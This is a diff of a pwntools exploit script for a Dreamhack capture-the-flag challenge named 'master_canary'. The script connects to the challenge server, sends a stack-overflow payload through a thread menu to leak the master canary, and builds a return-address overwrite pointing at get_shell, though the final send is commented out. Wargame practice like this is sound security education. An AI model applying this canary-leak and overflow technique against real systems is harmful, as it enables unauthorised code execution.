@@ -1,22 +1,43 @@
 from pwn import *
 
-p = remote("host3.dreamhack.games", 12008)
-#p = process("./mc_thread")
-e = ELF("./mc_thread")
+#p = process("./master_canary")
+p = remote("host3.dreamhack.games", 9892)
+e = ELF("./master_canary")
 
-giveshell = e.symbols['giveshell']
+get_shell = e.symbols['get_shell']
 
-offset = 0x948
+def create_thread():
+	global p
+	p.sendlineafter(b"> ", b"1")
 
-payload = b"A"*264
-payload += b"B"*8 #master canary
-payload += b"B"*8 #sfp
-payload += p64(giveshell)
-payload += b"C"*(offset - len(payload))
+def _input(size: bytes, data: bytes):
+	global p
+	p.sendlineafter(b"> ", b"2")
+	p.sendlineafter(b"Size: ", size)
+	p.sendlineafter(b"Data: ", data)
+
+def _exit(comment: bytes):
+	global p
+	p.sendlineafter(b"> ", b"3")
+	p.sendafter(b"Leave comment: ", comment)
+
+#offset = 0x1a28
+offset = 0x11b8
+
+payload = b"A"*offset
 payload += b"B"*8
 
-print(hex(len(payload)))
-p.sendlineafter(b"Size: ", str(len(payload)).encode())
-p.sendlineafter(b"Data: ", payload)
+create_thread()
+_input(str(len(payload)).encode(), payload)
+print(p.recvuntil(b"A"*offset + b"B"*8))
+print(p.recv(8))
+payload = b"A"*0x28
+payload += b"B"*0x8
+payload += b"A"*0x8
+payload += p64(get_shell)
+
+#_exit(payload)
+
 
 p.interactive()
+
